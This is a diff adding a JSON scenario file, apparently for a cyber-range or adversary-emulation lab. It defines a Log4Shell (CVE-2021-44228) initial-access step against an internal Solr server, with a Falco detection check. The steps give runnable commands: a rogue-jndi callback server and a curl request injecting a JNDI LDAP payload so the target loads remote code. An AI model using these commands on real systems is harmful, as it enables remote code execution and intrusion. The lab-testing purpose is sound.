@@ -1,0 +1,34 @@
+{
+  "_note": "핵심층 환경 — corp 킬체인 ① 외부→DMZ. Apache Solr 8.11.0 (Log4j 2.14.1) Log4Shell(CVE-2021-44228). ${jndi:ldap://발판:1389/x} 주입 → 발판 LDAP/HTTP 콜백 → 악성 클래스 로드 RCE. 조건 문법은 postgres.json(canonical) 참고. 진행도 선저작.",
+  "env": "corp-solr-log4shell",
+  "technique": "T1190",
+  "cve": "CVE-2021-44228",
+  "procedure": {
+    "id": "PROC-corp-solr-log4shell",
+    "name": "Solr Log4Shell JNDI 주입 RCE",
+    "description": "Solr(solr.corp-dmz.svc.cluster.local:8983)의 로깅되는 파라미터에 ${jndi:ldap://<발판IP>:1389/Exploit} 를 넣어 취약 Log4j 2.14.1 가 JNDI 조회를 하게 만들고, 발판(corp-ext)이 띄운 LDAP/HTTP 서버가 악성 Java 클래스를 돌려줘 Solr 가 로드·실행하게 한다. 발판은 marshalsec/rogue-jndi 로 :1389 콜백을 띄운다.",
+    "status": "AUTHORED",
+    "steps": [
+      {"id": "STEP-corp-solr-listener", "seq": 1,
+       "command": "java -jar rogue-jndi.jar --command 'id' --hostname 0.0.0.0 &",
+       "description": "발판에 악성 LDAP/HTTP 콜백 서버 기동(:1389)"},
+      {"id": "STEP-corp-solr-inject", "seq": 2,
+       "command": "curl -s 'http://solr.corp-dmz.svc.cluster.local:8983/solr/admin/cores?action=CREATE&name=${jndi:ldap://$FOOTHOLD_IP:1389/Exploit}'",
+       "description": "로깅 필드에 JNDI 페이로드 주입 → 발판 콜백 → 악성 클래스 로드 RCE(CVE-2021-44228)"}
+    ]
+  },
+  "preconditions": [
+    {"id": "PRE-corp-solr-log4j",
+     "name": "취약 Log4j + 발판 콜백 도달",
+     "description": "Solr 가 취약 Log4j 2.14.1 로 사용자 입력을 로깅하고, Solr→발판(:1389) egress 가 열려 JNDI 콜백이 가능."}
+  ],
+  "expected_results": [
+    {"id": "ER-corp-solr-progress",
+     "name": "Log4Shell RCE 흔적 (진행도)",
+     "kind": "progress",
+     "outcome": {"id": "AO-initial-access", "name": "초기 침투(DMZ RCE)"},
+     "conditions": [
+       {"channel": "falco", "field": "technique", "operator": "eq", "expected": "T1190"}
+     ]}
+  ]
+}
